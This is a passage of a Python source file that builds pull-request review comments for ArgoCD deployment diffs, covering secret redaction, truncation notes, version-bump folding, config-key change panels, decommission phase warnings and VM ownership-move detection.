            _extra = (f" *(+{len(_needles) - 5} more)*"
                      if len(_needles) > 5 else "")
            _fold_lines += [">", f"> Changed for another reason: "
                                 f"{_shown}{_extra}"]
        _fold_lines += [""]
    if not profile.inline_diffs:
        # COPS-2612: the block keeps its header (the app and its REAL
        # resource count) and points at the page. Narrow exception: with
        # COMMENT_INLINE_EVIDENCE_LINES > 0, a risk-flagged app still shows
        # that many lines from its offending resources, so a reviewer never
        # has to leave the comment to see WHY something is dangerous -- only
        # to see the rest. Routine apps stay fence-free.
        out += _fold_lines
        _n = profile.inline_evidence_lines
        if _n and risk_headers:
            for hdr, body in (sections or []):
                if hdr not in risk_headers:
                    continue
                _ev = _redact_for_display(hdr, _show_cr(body)).rstrip()
                _ev = "\n".join(_ev.split("\n")[:_n])
                out += [f"**`{_fence_safe(hdr)}`**", "", "```diff",
                        _fence_safe(_ev), "```", ""]
        return out + [_full_hunks_link(artifact_url, app=app), ""]
    out += _fold_lines
    inline = [(h, b) for h, b in (sections or []) if h not in folded]
    # Identical changes collapse to one hunk plus a count. Off on the
    # full-diff page (the caller leaves group_repeats False there), which
    # must stay the complete record.
    dups = {}
    if group_repeats:
        inline, dups = _group_repeated_sections(inline, risk_headers)
    if sections:
        if total > shown:
            # COPS-2567: only claim a plain prefix when it still is one.
            # COPS-2610: total > shown means the STORAGE cap trimmed this
            # app -- the remainder is gone from both surfaces, so on the
            # FULL page (the self-described complete record) the note must
            # own the shortfall instead of pointing at itself.
            if not profile.inline_diffs or profile.is_complete_record:
                note = (f"> \u26a0\ufe0f **Storage cap reached: showing "
                        f"{shown} of {total} changed resources.** The "
                        f"remainder was not retained "
                        f"(FULL_SECTIONS_MAX_PER_APP). See ArgoCD for the "
                        f"live state.")
            elif folded:
                # With the fold active "showing first N of M" would be
                # false; say what the storage cap left out instead.
                note = (f"> \U0001f50d {total - shown} more changed "
                        f"resource(s) beyond the storage cap are only in "
                        f"the full diff view.")
            else:
                n_risk = sum(1 for hdr, _ in sections
                             if hdr in (risk_headers or ()))
                if n_risk:
                    note = (f"> \U0001f50d Showing {shown} of {total} changed "
                            f"resources, the {n_risk} highest-risk one(s) "
                            f"first. See ArgoCD for the full set.")
                else:
                    note = (f"> \U0001f50d Showing first {shown} of {total} "
                            f"changed resources. See ArgoCD for the full set.")
            out += [note, ""]
        omitted = []
        used = sum(len(_l.encode("utf-8")) + 1 for _l in out)
        rendered_one = False
        for hdr, body in inline:
            if (size_budget is not None and rendered_one
                    and hdr not in (risk_headers or ())
                    and used > size_budget):
                # Intra-app readable budget (see format_comment): ordinary
                # sections past the budget fold into one pointer below.
                # Risk sections are exempt, and the first section always
                # renders so the block is never headline-only.
                omitted.append(hdr)
                omitted.extend(dups.get(hdr) or ())
                continue
            # Redaction happens here, at display time, so the diff engine
            # still compares real values and detects Secret changes.
            # v2.5.8: sections bodies are NOT pre-truncated (only
            # DiffResult.text is) — this docstring used to claim otherwise.
            # A single giant resource diff (huge ConfigMap rewrite) could
            # push the whole comment past MAX_COMMENT_BYTES, whose blunt
            # global cut chops off the footer and its status token. Cap
            # each body here WITH an explicit marker. Redact BEFORE the
            # cut so truncation can never split a value a redaction rule
            # would have caught.
            # v2.5.19 E3: make CR visible BEFORE redaction — the redaction
            # helpers use splitlines(), which silently eats a trailing \r, so
            # a CRLF<->LF-only change would otherwise collapse to "no visible
            # change". Convert first, then redact, then neutralize fences.
            body_disp = _redact_for_display(hdr, _show_cr(body)).rstrip()
            # profile.body_max_chars (COPS-2609/2610): a COMMENT protection
            # (one giant ConfigMap rewrite must not push the comment past
            # MAX_COMMENT_BYTES and chop the status token off). 0 = never
            # cut: the FULL page is the complete record and a cut there is
            # a lie, not a protection.
            if profile.body_max_chars and \
                    len(body_disp) > profile.body_max_chars:
                body_disp = (body_disp[:profile.body_max_chars].rstrip()
                             + "\n... (diff truncated for display \u2014 see "
                               "ArgoCD for the full resource diff)")
            body_disp = _fence_safe(body_disp)
            chunk = [f"**`{_fence_safe(hdr)}`**", "", "```diff", body_disp,
                     "```", ""]
            _same = dups.get(hdr) or []
            if _same:
                chunk += [f"> \u267b\ufe0f **{len(_same)} more resource(s) "
                          f"change exactly the same lines.**"]
                _also = _name_list(_same)
                if _also:
                    chunk += [">", f"> Same change: {_also}"]
                chunk += [""]
            for _l in chunk:
                used += len(_l.encode("utf-8")) + 1
            out += chunk
            rendered_one = True
        if omitted:
            out += [f"> \u2702\ufe0f **{len(omitted)} more changed "
                    f"resource(s) omitted** here to keep the comment "
                    f"scannable. None is a deletion, zeroed replica or "
                    f"VM change. {_full_hunks_link(artifact_url, app=app)}"]
            _names = _name_list(omitted)
            if _names:
                out += [">", f"> Omitted: {_names}"]
            out += [""]
    elif diff_text:
        # v2.5.17: this fallback (sections not supplied -- reachable through
        # _result()'s legacy 3-tuple coercion, which rebuilds sections with
        # parse_diff_sections() but skips _filter_diff_sections(), and can
        # end up with an empty section list for non-empty text) used to run
        # only the flat _redact_sensitive() pass. That pass is not kind-aware
        # and only catches keys matching _SENSITIVE_KEYS, so a `kind: Secret`
        # body reaching this branch was never whole-masked, and any Secret
        # data key not in that list (tls.crt, ca.bundle, .dockerconfigjson,
        # ...) leaked verbatim. Confirmed live with a probe. Not reachable
        # through the real diff pipeline today (argocd_diff always keeps
        # diff_text and sections in lockstep), but a real landmine for the
        # legacy path or a future refactor that breaks that invariant.
        #
        # Fix: recover the same (hdr, body) sections the primary path above
        # would have had and redact each one the same way. Only fall back
        # further to the flat pass when the text has no "===== hdr ====="
        # markers at all to key off (truly unstructured legacy diff text).
        legacy_secs = parse_diff_sections(diff_text)
        if legacy_secs:
            redacted = "\n".join(
                f"===== {hdr} =====\n{_redact_for_display(hdr, _show_cr(body)).rstrip()}"
                for hdr, body in legacy_secs
            )
        else:
            redacted = _redact_sensitive(_show_cr(diff_text)).rstrip()
        out += ["```diff", _fence_safe(redacted), "```", ""]
    return out


_SENSITIVE_KEY_RE = re.compile(r"password|secret|token|credential|apikey|api_key|privatekey", re.I)
_INPUT_CHANGES_MAX_LINES = 24


def _fmt_input_val(key: str, val) -> str:
    """Render a value for the input panel: sensitive keys never echo values."""
    if _SENSITIVE_KEY_RE.search(key):
        return "***"
    txt = val if isinstance(val, str) else repr(val)
    return f"`{txt[:48]}{'...' if len(txt) > 48 else ''}`"


def _flatten_yaml(node, prefix=""):
    """Flatten nested mappings to {dotted.path: scalar/list} (PyYAML output)."""
    out = {}
    if isinstance(node, dict):
        for k, v in node.items():
            p = f"{prefix}.{k}" if prefix else str(k)
            if isinstance(v, dict):
                out.update(_flatten_yaml(v, p))
            else:
                out[p] = v
    return out


_MICROSERVICE_KEY_RE = re.compile(
    r"^appspace\.microservices\.definitions\.([^.]+)\.(.+)$")
INPUT_ROLLUP_MIN_SERVICES = 3  # collapse only when it actually saves space


def _service_and_rest(key: str):
    """Split 'appspace.microservices.definitions.<service>.<rest>' into
    (service, rest). Returns (None, key) for any key outside that shape,
    so the caller leaves it un-rolled-up."""
    m = _MICROSERVICE_KEY_RE.match(key)
    return (m.group(1), m.group(2)) if m else (None, key)


def _rollup_by_service(keys: list, sig_fn, render_group, render_single) -> list:
    """Group full dotted keys sharing the
    appspace.microservices.definitions.<service>.<rest> shape by (rest,
    sig_fn(key)), collapsing any group of INPUT_ROLLUP_MIN_SERVICES or
    more services into ONE line via render_group(rest, sig, services).
    Smaller groups and any key outside that shape render individually via
    render_single(key) -- the exact same per-key line as before this
    existed, so a typical small PR (one or two services touched) is
    byte-for-byte unchanged.

    v2.7.0, born from acme-config-prod PR #3837: removing the Spot
    compute-class override from 67 services rendered as 67 near-identical
    bullets, capped at 25 lines with "+110 more" and no way for a reviewer
    to tell it was one change applied 67 times.
    """
    buckets, order, singles = {}, [], []
    for k in keys:
        service, rest = _service_and_rest(k)
        if service is None:
            singles.append(k)
            continue
        bucket_key = (rest, sig_fn(k))
        if bucket_key not in buckets:
            buckets[bucket_key] = []
            order.append(bucket_key)
        buckets[bucket_key].append(service)

    lines = []
    for rest, sig in order:
        services = sorted(buckets[(rest, sig)])
        if len(services) >= INPUT_ROLLUP_MIN_SERVICES:
            lines.append(render_group(rest, sig, services))
        else:
            for s in services:
                lines.append(render_single(
                    f"appspace.microservices.definitions.{s}.{rest}"))
    for k in singles:
        lines.append(render_single(k))
    return lines


def _fmt_service_list(services: list, shown: int = 8) -> str:
    head = ", ".join(services[:shown])
    more = f" (+{len(services) - shown} more)" if len(services) > shown else ""
    return f"{head}{more}"


# ── Routine version-bump classification ─────────────────────────────
# The 83.7% case at fleet scale: acme-config-prod PR #3891 bumped
# appspace.version in 8 files and the comment rendered 473 near-identical
# diff blocks before hitting the 245KB truncation wall. Fingerprint
# grouping cannot collapse those — each environment's rendered diff
# differs in names/labels, so every app formed its own group. This
# classifier is the deterministic complement: it recognizes a diff whose
# EVERY changed line is version-shaped, so format_comment can fold
# equivalent-but-not-identical groups into one summary line per distinct
# transition. Deliberately conservative, in the same spirit as
# _is_rename_of: a false positive here HIDES a real change behind a
# one-liner, which is strictly worse than the verbosity it fixes. Any risk
# fact (deletion, zeroed replicas, rename, VM change, downgrade), any
# non-version key, any one-sided add/remove of a key, and any unkeyed
# changed line keeps the app fully enumerated.

_ROUTINE_KEY_BASES = ("image", "tag", "targetrevision")
_VERSIONISH_VAL_RE = re.compile(r"^v?\d[\w.+-]*$")


def _routine_bump_key_ok(key: str, old: str, new: str) -> bool:
    """True when one changed key is version-shaped enough to fold.

    Grounded in the changed-line census of PR #3891's comment: the bump is
    `image:` + `app.kubernetes.io/version:` pairs, env-var `value:` lines
    carrying bare version strings, and checksum annotations (cascade
    noise, ignored upstream). `value:` only qualifies when BOTH sides look
    like a version string, so a feature-flag value can never fold silently.
    """
    base = key.rsplit("/", 1)[-1].rsplit(".", 1)[-1].lower()
    if base in _ROUTINE_KEY_BASES or "version" in key.lower():
        return True
    if base == "value":
        return bool(_VERSIONISH_VAL_RE.match(old)
                    and _VERSIONISH_VAL_RE.match(new))
    return False


def _routine_bump_signature(r):
    """(old_rev, new_rev, ((key, olds, news), ...)) for a routine bump, else None.

    Two apps with the SAME signature take the same change even when their
    rendered diffs are not byte-identical, so format_comment can fold
    their fingerprint groups together. None means "not provably routine"
    and the app renders in full — this fails open toward verbosity, never
    toward hiding a change.
    """
    if r.outcome != OUT_DIFF or not r.sections:
        return None
    if (r.deleted_resources or r.replicas_zeroed or r.renamed_resources
            or getattr(r, "vm_changes", None)):
        return None
    if r.version_change and _is_version_downgrade(*r.version_change):
        return None
    minus, plus = {}, {}
    for _hdr, body in r.sections:
        for line in body.splitlines():
            if line.startswith("+++") or line.startswith("---"):
                continue
            sign = line[:1]
            if sign not in ("+", "-"):
                continue
            content = line[1:].strip()
            key, colon, val = content.partition(":")
            key = key.strip()
            if not colon or not key:
                return None       # a structural/unkeyed line changed
            val = _vm_unquote(val)
            if key.startswith("checksum/"):
                continue           # pure cascade noise on either side
            (plus if sign == "+" else minus).setdefault(key, set()).add(val)
    if set(minus) != set(plus):
        return None                # one-sided add/remove of a key
    items = []
    for key in sorted(minus):
        olds, news = minus[key], plus[key]
        if olds == news:
            continue               # reorder-only, not a change
        for o in olds:
            for n in news:
                if not _routine_bump_key_ok(key, o, n):
                    return None
        items.append((key, "|".join(sorted(olds)), "|".join(sorted(news))))
    if not items and not r.version_change:
        return None
    vc = r.version_change or ("", "")
    return (vc[0] or "", vc[1] or "", tuple(items))


def _routine_bump_label(sig) -> str:
    """One human line naming the transition a rollup group shares."""
    old_rev, new_rev, items = sig
    if old_rev or new_rev:
        label = f"chart `{old_rev}` \u2192 `{new_rev}`"
        extra = len(items)
    elif items:
        key, olds, news = items[0]
        label = f"`{key}`: `{olds}` \u2192 `{news}`"
        extra = len(items) - 1
    else:
        return "version-only change"
    if extra > 0:
        label += f" (+{extra} more field(s))"
    return label


def _summarize_input_changes(changed_files, pr_sha, base_sha, repo=None,
                             full=False) -> list:
    """Markdown block: key-level changes this PR makes to its value files.

    v2.6.2 (born from acme-config-dev PR #6848): the comment showed a chart
    downgrade and 10 resource deletions - the SYMPTOMS - but never that the
    PR had also deleted the `ashn:` line from customer.yaml, the kind of
    silent input edit a reviewer cannot see without opening the file diff.
    This section is the CAUSE panel: for every value file modified on both
    sides, list removed keys (the #1 silent hazard, flagged loudest), value
    changes (old -> new) and added keys. Files that exist on only one side
    are new-env/decommission territory and already have their own dedicated
    blocks - skipped here. Values under password/secret/token-ish keys are
    never echoed. Output is capped; unparseable files are noted, never fatal.
    """
    # full=True is the render behind the full-diff view: no file cap and no
    # line budget, so the persisted page really does show every changed
    # file key by key. The comment keeps the tight caps.
    out, budget = [], (10 ** 9 if full else _INPUT_CHANGES_MAX_LINES)
    for path in (list(changed_files or []) if full
                 else (changed_files or [])[:8]):
        if not path.endswith((".yaml", ".yml")):
            continue
        new_txt, st_new = _bb_fetch_cached(path, pr_sha, repo=repo)
        old_txt, st_old = _bb_fetch_cached(path, base_sha, repo=repo)
        if st_new != BB_OK or st_old != BB_OK:
            continue  # added/deleted file: new-env / decommission territory
        try:
            new_flat = _flatten_yaml(yaml.safe_load(new_txt) or {})
            old_flat = _flatten_yaml(yaml.safe_load(old_txt) or {})
        except yaml.YAMLError:
            out += [f"`{path}`: changed (not parseable as YAML)", ""]
            continue
        if not new_flat and not old_flat:
            out += [f"`{path}`: changed (no scannable keys)", ""]
            continue
        removed = sorted(set(old_flat) - set(new_flat))
        added   = sorted(set(new_flat) - set(old_flat))
        changed = sorted(k for k in set(old_flat) & set(new_flat)
                         if old_flat[k] != new_flat[k])
        if not (removed or added or changed):
            continue
        # Blank line is load-bearing: without it Bitbucket renders the
        # bullets below INLINE into this heading. Seen on 44 of the last
        # 50 acme-config-prod comments, e.g. PR #3893 showing
        # "customer.yaml: - added appspace.decommission = True" on one line.
        file_lines = [f"`{path}`:", ""]
        file_lines += _rollup_by_service(
            removed,
            sig_fn=lambda k: _fmt_input_val(k, old_flat[k]),
            render_group=lambda rest, val, services: (
                f"- \u26a0\ufe0f **removed** `{rest}` (was {val}) from "
                f"**{len(services)} services**: {_fmt_service_list(services)}"),
            render_single=lambda k: (
                f"- \u26a0\ufe0f **removed** `{k}` "
                f"(was {_fmt_input_val(k, old_flat[k])})"),
        )
        file_lines += _rollup_by_service(
            changed,
            sig_fn=lambda k: (_fmt_input_val(k, old_flat[k]),
                              _fmt_input_val(k, new_flat[k])),
            render_group=lambda rest, sig, services: (
                f"- `{rest}`: {sig[0]} \u2192 {sig[1]} for "
                f"**{len(services)} services**: {_fmt_service_list(services)}"),
            render_single=lambda k: (
                f"- `{k}`: {_fmt_input_val(k, old_flat[k])} "
                f"\u2192 {_fmt_input_val(k, new_flat[k])}"),
        )
        file_lines += _rollup_by_service(
            added,
            sig_fn=lambda k: _fmt_input_val(k, new_flat[k]),
            render_group=lambda rest, val, services: (
                f"- **added** `{rest}` = {val} for "
                f"**{len(services)} services**: {_fmt_service_list(services)}"),
            render_single=lambda k: (
                f"- **added** `{k}` = {_fmt_input_val(k, new_flat[k])}"),
        )
        if len(file_lines) - 1 > budget:
            keep = max(budget, 1)
            file_lines = file_lines[:keep + 1] + [
                f"- ... +{len(file_lines) - 1 - keep} more change(s) in this file"]
        out += file_lines + [""]
        budget -= len(file_lines) - 1
        if budget <= 0:
            break
    if not out:
        return []
    return ["### \U0001f4dd Config changes in this PR", ""] + out


def _autosync_paused(flat: dict) -> bool:
    """Mirrors the ApplicationSet templatePatch condition exactly (COPS-2583):
    `{{- if eq (printf "%v" .appspace.autosync) "false" }}`. Only the literal
    string "false" pauses auto-sync -- a missing key, true, or any other
    value leaves it on. This must never diverge from the production
    condition, or the warning could say the opposite of what ArgoCD does."""
    return str(flat.get("appspace.autosync", "")).lower() == "false"


def _decommission_armed_flat(flat: dict) -> bool:
    """Same parsing _decommission_cascades uses, applied to an already
    flattened dict instead of re-fetching from Bitbucket."""
    return str(flat.get("appspace.decommission", "")).lower() == "true"


def _purge_armed_flat(flat: dict) -> bool:
    """Same fail-closed AND _decommission_purges_data uses: purge is inert
    unless decommission is armed too."""
    return (_decommission_armed_flat(flat)
            and str(flat.get("appspace.decommissionPurgeData", "")).lower() == "true")


def _vm_deletion_armed_flat(flat: dict) -> bool:
    """Phase 1 state: the real VM, disk and IP are only deleted by the
    cascade when allowDeletion is armed. Same key _decommission_fully_phased
    reads, applied to an already flattened dict."""
    val = flat.get("appspace.infra.deployLinuxServicesK8s.defaults.allowDeletion")
    return str(val).strip().lower() == "true"


def _declares_vms_flat(flat: dict) -> bool:
    """Whether the environment declares linux service VMs at all. Same test
    _decommission_fully_phased applies, and the reason delete.md says to skip
    Phase 1 when there are none."""
    return any(k.startswith("appspace.infra.deployLinuxServicesK8s")
               for k in flat)


# Phase numbering is canonical per acme-components documentation/delete.md
# and the _decommission_fully_phased docstring, which agree: arming the VM
# deletion is Phase 1, arming the cascade (optionally purging data) is
# Phase 2, removing the folder is Phase 3. The rendered panel used to call
# arming the cascade "Phase 1", contradicting both, and a reviewer reading
# the comment and the runbook side by side got two different models
# (COPS-2616).
_PH_DONE = "\u2705 **done**"
_PH_THIS_PR = "\u2705 **this PR**"
_PH_PENDING = "\u2b1c pending"
_PH_NA = "\u2014 not applicable"


def _decommission_phase_table(vm_state, cascade_state, removal_state,
                              declares_vms: bool, purge: bool = False) -> list:
    """The one phase table, rendered identically by all three decommission
    panels. Each *_state is one of the _PH_* constants, or None to fall back
    to pending.

    Callers pass the states they already have in scope; nothing is fetched
    here. Phase 1 is always rendered so the model stays complete, but reads
    "not applicable" when the environment declares no VMs -- delete.md says
    to skip the step, not to hide that the step exists, and a table that
    silently started at Phase 2 would just make the reader wonder what they
    were missing.
    """
    purge_note = (" \u2014 with `decommissionPurgeData` armed the cascade will "
                  "**permanently destroy** the BigQuery dataset and the user "
                  "content bucket, not just abandon them"
                  if purge else
                  " \u2014 `decommissionPurgeData` is not armed, so the "
                  "BigQuery dataset and the content bucket are abandoned and "
                  "stay recoverable")
    # The pointer to the inventory only makes sense while Phase 3 is still
    # ahead of the reviewer; on the removal PR itself they are already
    # looking at that inventory.
    removal_note = ("deletes the Applications and every resource they manage, "
                    "Config Connector cloud resources included \u2014 the "
                    "destructive step, and this PR is it"
                    if removal_state == _PH_THIS_PR else
                    "a later PR deletes the Applications and every resource "
                    "they manage, Config Connector cloud resources included; "
                    "that PR gets its own full inventory panel")
    rows = ["| Phase | State | What it does |",
            "|-------|-------|--------------|"]
    if declares_vms:
        vm_note = ("`deployLinuxServicesK8s.defaults.allowDeletion` lets the "
                   "cascade delete the real VM, its data disk and its reserved "
                   "IP; without it they survive under the abandon policy")
        rows.append(
            f"| **Phase 1 \u2014 arm VM deletion** | {vm_state or _PH_PENDING} | "
            f"{vm_note} |")
    else:
        rows.append(
            f"| **Phase 1 \u2014 arm VM deletion** | {_PH_NA} | this environment "
            "declares no `deployLinuxServicesK8s` VMs, so there is nothing to "
            "arm |")
    rows.append(
        f"| **Phase 2 \u2014 arm cascade** | {cascade_state or _PH_PENDING} | "
        "`appspace.decommission` makes the Applications eligible for the "
        f"cascade-delete finalizer{purge_note} |")
    rows.append(
        f"| **Phase 3 \u2014 remove folder** | {removal_state or _PH_PENDING} | "
        f"{removal_note} |")
    return rows


def _summarize_appspace_state_changes(changed_files, pr_sha, base_sha, path_map, repo=None) -> list:
    """Markdown block calling out changes to Application-level state flags
    read from a LIVE environment's own customer.yaml/config.yaml:
    appspace.autosync (COPS-2583) and appspace.decommission /
    appspace.decommissionPurgeData (COPS-2539/COPS-2572).

    COPS-2584: both flags change ArgoCD's behaviour for an entire
    environment without touching a single rendered manifest, so every
    existing symptom panel (chart diff, resource diff) shows nothing, and
    _summarize_input_changes reports the key change with the same weight as
    any other line in customer.yaml. A PR that freezes an environment, or
    arms it for a later deletion, must not read like a no-op next to a
    green "no manifest changes" status.

    Reuses the SAME _bb_fetch_cached cache _summarize_input_changes already
    populates for these files -- a second read of the same (path, sha) is a
    cache hit, not a second Bitbucket call. Only fires for identity files
    that are a currently-live environment's own file (present in path_map)
    AND present on both sides of the diff; a file that exists on only one
    side is new-env or decommission-by-deletion territory, already covered
    by their own dedicated panels, and must not get a second, possibly
    contradictory message here.
    """
    lines = []
    seen = set()
    for f in changed_files or []:
        clean = posixpath.normpath(f.lstrip("/"))
        if clean in seen:
            continue
        if posixpath.basename(clean) not in _IDENTITY_BASENAMES:
            continue
        apps = path_map.get(clean)
        if not apps:
            continue  # not a currently-live environment's own identity file
        seen.add(clean)

        new_txt, st_new = _bb_fetch_cached(clean, pr_sha, repo=repo)
        old_txt, st_old = _bb_fetch_cached(clean, base_sha, repo=repo)
        if st_new != BB_OK or st_old != BB_OK:
            continue  # added/deleted file -- new-env/decommission-by-deletion territory

        try:
            new_flat = _flatten_yaml(yaml.safe_load(new_txt) or {})
            old_flat = _flatten_yaml(yaml.safe_load(old_txt) or {})
        except yaml.YAMLError:
            continue  # unparseable -- _summarize_input_changes already flags this

        env_name = posixpath.basename(posixpath.dirname(clean))
        app_names = sorted(a.split("/")[-1] for a in apps)
        app_list = ", ".join(f"`{a}`" for a in app_names)

        # -- autosync (COPS-2583) --
        was_paused, is_paused = _autosync_paused(old_flat), _autosync_paused(new_flat)
        if not was_paused and is_paused:
            lines += [
                f"### \u23f8\ufe0f Auto-sync PAUSED for `{env_name}`",
                "",
                f"`appspace.autosync: false` was added to this environment's " +
                f"`customer.yaml`. Automated sync stops for {app_list} \u2014 " +
                f"resources keep running and manual sync still works, but this " +
                f"environment will not receive any further config changes until " +
                f"the flag is removed.",
                "",
            ]
        elif was_paused and not is_paused:
            lines += [
                f"### \u25b6\ufe0f Auto-sync RESUMED for `{env_name}`",
                "",
                f"`appspace.autosync: false` was removed from this environment's " +
                f"`customer.yaml`. Automated sync resumes for {app_list}. If this " +
                f"environment drifted while paused, resuming applies the " +
                f"accumulated diff immediately \u2014 check its sync status before " +
                f"merging if that matters.",
                "",
            ]
        elif is_paused:
            lines += [
                f"*`{env_name}` remains paused (`appspace.autosync: false`) \u2014 " +
                f"this PR's other changes to it will not be applied until it " +
                f"resumes: {app_list}.*",
                "",
            ]

        # -- decommission / decommissionPurgeData (COPS-2539/COPS-2572) --
        was_armed, is_armed = _decommission_armed_flat(old_flat), _decommission_armed_flat(new_flat)
        was_purge, is_purge = _purge_armed_flat(old_flat), _purge_armed_flat(new_flat)
        if not was_armed and is_armed:
            # The phase table is shared with the arm-purge and folder-removal
            # panels (_decommission_phase_table), so a reviewer sees the same
            # three rows on every PR of the sequence with only the marks
            # moving. Numbering follows delete.md, not the old panel-local
            # numbering (COPS-2616).
            lines += [
                f"## \U0001f512\u26a0\ufe0f DECOMMISSION ARMED for `{env_name}` \u26a0\ufe0f\U0001f512",
                "",
                f"**`appspace.decommission: true` was added. This PR deletes "
                f"nothing by itself.** {app_list} become eligible for the "
                f"cascade-delete finalizer, which only acts when this "
                f"environment's folder is removed in a later PR.",
                "",
            ] + _decommission_phase_table(
                vm_state=(_PH_DONE if _vm_deletion_armed_flat(new_flat) else None),
                cascade_state=_PH_THIS_PR,
                removal_state=None,
                declares_vms=_declares_vms_flat(new_flat),
                purge=is_purge,
            ) + [
                "",
                f"**Nothing changes for `{env_name}` until Phase 3:** every "
                f"workload keeps running, disks stay held, costs keep accruing "
                f"and the environment is still managed by ArgoCD.",
                "",
                f"Even a full cascade leaves the content backup bucket and "
                f"some namespace-level leftovers behind. Full procedure: see "
                f"`acme-components` `documentation/`.",
                "",
            ]
        elif was_armed and not is_armed:
            lines += [
                f"### \U0001f513 Decommission DISARMED for `{env_name}`",
                "",
                f"`appspace.decommission` was removed. {app_list} are no longer " +
                f"eligible for cascade deletion if this environment's folder is " +
                f"removed later.",
                "",
            ]
        elif is_armed and not was_purge and is_purge:
            lines += [
                f"## \U0001f6a8 PURGE ARMED for already-decommissioned `{env_name}` \U0001f6a8",
                "",
                f"**`appspace.decommissionPurgeData: true` was added to an " +
                f"environment already armed for decommission.** {app_list} will " +
                f"now permanently destroy the BigQuery dataset and the user " +
                f"content bucket when the cascade runs, not just abandon them.",
                "",
            ] + _decommission_phase_table(
                # The cascade is already armed at base -- that is this
                # branch's own condition -- so Phase 2 reads done, and this
                # PR is the purge qualifier on it.
                vm_state=(_PH_DONE if _vm_deletion_armed_flat(new_flat) else None),
                cascade_state=_PH_THIS_PR,
                removal_state=None,
                declares_vms=_declares_vms_flat(new_flat),
                purge=True,
            ) + [
                "",
            ]
        elif is_armed and was_purge and not is_purge:
            lines += [
                f"*`{env_name}` decommission remains armed, but " +
                f"`appspace.decommissionPurgeData` was removed \u2014 data is no " +
                f"longer purged by the cascade.*",
                "",
            ]

    return lines


_VM_VALUES_PREFIX = "appspace.infra.deployLinuxServicesK8s."
# Every values-level key path that provisions a virtual machine. The
# corpus of the last 50 acme-config-prod PRs carries deployLinuxServicesK8s
# (x17), the LEGACY non-KCC deployLinuxServices (x9) and deployWindows
# (x5), all live at the same time. Detecting only the K8s one silently
# missed PR #3844, which changed a Deloitte VM from n2d-custom-16-49152 to
# n2-custom-12-49152 (a downsize) and whose comment said "No manifest
# changes" -- exactly the failure this panel exists to prevent.
_VM_VALUES_PREFIXES = (
    "appspace.infra.deployLinuxServicesK8s.",
    "appspace.infra.deployLinuxServices.",
    "appspace.infra.deployWindows.",
)
_VM_DOMAIN_LABELS = {
    "appspace.infra.deployLinuxServicesK8s.": "linux VM (KCC)",
    "appspace.infra.deployLinuxServices.": "linux VM (legacy)",
    "appspace.infra.deployWindows.": "Windows VM",
}
# Disk-size keys differ between the legacy and KCC value schemas.
_VM_DISK_SIZE_KEYS = ("dataDiskSizeGb", "bootDiskSizeGb",
                      "dataDiskSize", "bootDiskSize", "diskSize")
_VM_DISK_TYPE_KEYS = ("dataDiskType", "bootDiskType", "diskType")
_VM_ROLE_NAMES = ("defaults", "svc", "mongo", "rabbit")

_LEGACY_PREFIX = "appspace.infra.deployLinuxServices."
_KCC_PREFIX = "appspace.infra.deployLinuxServicesK8s."


def _norm_machine_type(v) -> str:
    """Compare machine types the way an operator reads them: trimmed,
    unquoted, case-insensitive. `n2d-highmem-2` and ` "N2D-Highmem-2" `
    are the same machine, and a PR that only re-quotes a value is not a
    resize."""
    return str(v or "").strip().strip("'\"").strip().lower()


def _kcc_enabled_roles(flat: dict) -> list:
    """Roles explicitly enabled under the KCC key. `defaults` is config, not
    a role, so it never appears here."""
    return sorted({
        k[len(_KCC_PREFIX):].split(".", 1)[0]
        for k, v in flat.items()
        if k.startswith(_KCC_PREFIX)
        and k.endswith(".enabled")
        and str(v).strip().lower() == "true"
        and k[len(_KCC_PREFIX):].split(".", 1)[0] in _VM_ROLE_NAMES
        and k[len(_KCC_PREFIX):].split(".", 1)[0] != "defaults"
    })


def _kcc_role_value(flat: dict, role: str, leaf: str):
    """A role's value for a leaf, falling back to `defaults` the way the
    chart does."""
    v = flat.get(f"{_KCC_PREFIX}{role}.{leaf}")
    return flat.get(f"{_KCC_PREFIX}defaults.{leaf}") if v is None else v


def _detect_kcc_adoption(old_flat: dict, new_flat: dict) -> dict:
    """Classify a values-level change as a Terraform -> KCC ownership
    transfer, in which the existing GCP VM is adopted by name and nothing
    is created or resized (COPS-2608).

    Returns a dict when the file is an ownership move, otherwise None:

      {"kind": "adoption", "roles": [...]}  the VM changes owner and is
          adopted by name; gets the card;
      {"kind": "cleanup"}                    KCC was already live at base
          and this PR only drops the dead legacy block; routine, no card.

    Both suppress the machineType danger, because in neither case is a
    machine being resized. Only the first renders a card.

    Deliberately conservative: anything it cannot prove is an ownership
    move is left to the existing danger rules, because a false "this is
    safe" is far worse than a false alarm.

    Not an ownership move, on purpose:
      - `createNewBootDisk` true on an enabled role: that builds a new VM;
      - machine types that genuinely differ: a resize wearing adoption's
        coat;
      - legacy keys removed with no KCC role enabled at all: that is a VM
        being switched off, which is exactly what the danger rules exist
        for.

    When the legacy `machineType` is absent the comparison is treated as
    satisfied: the old Terraform module defaulted that value, so a
    customer.yaml that relied on the default has no old value, and nothing
    that does not exist can be changing. The rendered level stays the
    authority in that case.
    """
    legacy_removed = any(
        k.startswith(_LEGACY_PREFIX) and k in old_flat and k not in new_flat
        for k in set(old_flat) - set(new_flat))
    if not legacy_removed:
        return None

    roles = _kcc_enabled_roles(new_flat)
    if not roles:
        return None

    # KCC already live at base with the same roles: this PR only drops the
    # dead legacy block. Nothing is adopted, nothing is resized.
    if _kcc_enabled_roles(old_flat) == roles:
        return {"kind": "cleanup"}

    legacy_mt = None
    for k, v in old_flat.items():
        if k.startswith(_LEGACY_PREFIX) and k.rsplit(".", 1)[-1] == "machineType":
            legacy_mt = v
            break

    facts = []
    for role in roles:
        if str(_kcc_role_value(new_flat, role, "createNewBootDisk")
               ).strip().lower() != "false":
            return None  # greenfield, or unspecified: not provably adoption
        mt = _kcc_role_value(new_flat, role, "machineType")
        if (legacy_mt is not None
                and _norm_machine_type(mt) != _norm_machine_type(legacy_mt)):
            return None  # the values really differ: it is a resize
        facts.append({
            "role": role,
            "instance": _kcc_role_value(new_flat, role, "instanceName"),
            "machineType": mt,
            "dataDiskSizeGb": _kcc_role_value(new_flat, role, "dataDiskSizeGb"),
            "manageMetadata": _kcc_role_value(new_flat, role, "manageMetadata"),
        })
    return {"kind": "adoption", "roles": facts}


def _kcc_move_disk_shrink(old_flat: dict, new_flat: dict, roles: list) -> str:
    """Danger reason when a disk shrinks *across* the Terraform -> KCC key
    move, or "" when it does not.

    The ordinary shrink rule compares old and new of the same key, so it is
    blind here: the old size lives on `deployLinuxServices.dataDiskSizeGb`
    and the new one on `deployLinuxServicesK8s.<role>.dataDiskSizeGb`. Two
    different keys are never compared, so a 256 -> 128 shrink slipped
